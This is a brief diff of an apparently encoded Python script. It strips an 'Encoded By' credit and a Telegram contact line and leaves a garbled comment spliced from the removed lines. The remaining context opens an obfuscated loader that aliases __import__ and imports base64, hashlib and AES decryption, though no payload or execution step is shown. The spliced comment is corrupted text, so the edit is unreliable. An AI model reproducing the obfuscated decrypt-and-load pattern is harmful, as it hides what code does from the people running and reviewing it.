@@ -1,6 +1,4 @@
-# Encoded By // KIANSANTANG DEV
-# Contact me // t.me/xqndrs66
-# Ensure Python python3.12 is used to avoid incompatibility
+# Encoded By hon3.12 isncompatibility
 try:
     m=__import__;b=m("base64");h=m("hashlib")
     c=m("Crypto.Cipher.AES", fromlist=["AES"]);u=m("Crypto.Util.Padding", fromlist=["unpad"]).unpad
